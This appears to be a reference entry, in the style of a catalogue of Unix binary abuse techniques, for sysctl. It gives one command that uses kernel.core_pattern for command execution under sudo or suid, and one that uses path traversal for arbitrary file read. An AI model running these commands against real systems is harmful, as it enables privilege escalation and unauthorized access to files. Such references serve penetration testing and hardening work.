title: sysctl
html:
sysctl

Command Execution

Context: sudo, suid

sysctl 'kernel.core_pattern=|/path/to/command'

File Read

Context: sudo, suid, unprivileged

sysctl -n "/../../path/to/input-file"
excerpt: sysctl Command Execution Context: sudo, suid sysctl 'kernel.core_pattern=|/path/to/command' File Read Context: sudo, suid, unprivileged sysctl -n "/../../path/to/input-file"
